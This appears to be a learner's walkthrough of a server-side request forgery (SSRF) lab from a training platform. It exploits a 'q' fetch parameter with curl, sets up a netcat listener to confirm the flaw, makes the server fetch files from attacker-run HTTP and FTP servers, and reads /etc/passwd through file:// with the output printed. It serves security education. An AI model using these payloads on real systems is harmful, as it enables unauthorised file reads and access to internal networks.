Attack flow of SSRF:

![image](https://github.com/offensivecyber03/htbacademy/assets/71892943/a54adcb7-ae6f-43e9-a42f-db3a8c41175d)

## Curl - Interacting with the Target
`-i` to show protocol response header
`-s` to use silent mode

```bash
┌──(hunter㉿kali)-[~]
└─$ curl -i -s http://10.129.34.24
HTTP/1.0 302 FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 242
Location: http://10.129.34.24/load?q=index.html
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 10 Oct 2023 01:28:54 GMT

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="/load?q=index.html">/load?q=index.html</a>. If not click the link.
```

We can see the request redirected to /load?q=index.html, meaning the q parameter fetches the resource index.html. Let's see with `-L`
```bash
┌──(hunter㉿kali)-[~]
└─$ curl -i -s -L http://10.129.34.24
HTTP/1.0 302 FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 242
Location: http://10.129.34.24/load?q=index.html
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 10 Oct 2023 01:29:31 GMT

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 153
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 10 Oct 2023 01:29:32 GMT

<html>
<!-- ubuntu-web.lalaguna.local & internal.app.local load resources via q parameter -->
<body>
<h1>Bad App</h1>
<a>Hello World!</a>
</body>
</html>
```

The spawned target is ubuntu-web.lalaguna.local, and internal.app.local is an application 
on the internal network (inaccessible from our current position).

I will check to confirm SSRF vulnerability:
1) Start nc listener
```bash
┌──(hunter㉿kali)-[~]
└─$ nc -lvnp 8080
listening on [any] 8080 ...
```
2) Send url with pointing listener port:
```bash
curl -i -s "http://10.129.34.24/load?q=http://10.10.16.3:8080"
```
3) At the end I recieved response confirming SSRF vulnerability
```bash
┌──(hunter㉿kali)-[~]
└─$ nc -lvnp 8080
listening on [any] 8080 ...
connect to [10.10.16.3] from (UNKNOWN) [10.129.34.24] 45800
GET / HTTP/1.1
Accept-Encoding: identity
Host: 10.10.16.3:8080
User-Agent: Python-urllib/3.8
Connection: close
```
Reading the Python-urllib documentation, we can see it supports file, http and ftp schemas. 
So, apart from issuing HTTP requests to other services on behalf of the target application,
we can also read local files via the file schema and remote files using ftp.

We can test this functionality through the steps below:

    Create a file called index.html
```bash
<html>
</body>
<a>SSRF</a>
<body>
<html>
```
1) Inside directory where index.html located start http and ftp server:
`python3 -m http.server 9090`
After installing `twistesudo` with pip3 then start ftp server:
`python3 -m twisted ftp -p 21 -r .d`

## Retrieving a remote file through the target application - FTP Schema
```bash
curl -i -s "http://10.129.34.24/load?q=ftp://10.10.10.10/index.html"
```
## Retrieving a remote file through the target application - HTTP Schema
```bash
curl -i -s "http://10.129.34.24/load?q=http://10.10.10.10:9090/index.html"
```

## Retrieving a local file through the target application - File Schema
```bash
┌──(hunter㉿kali)-[~]
└─$ curl -i -s "http://10.129.34.24/load?q=file:///etc/passwd"
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 925
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 10 Oct 2023 01:36:39 GMT

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```





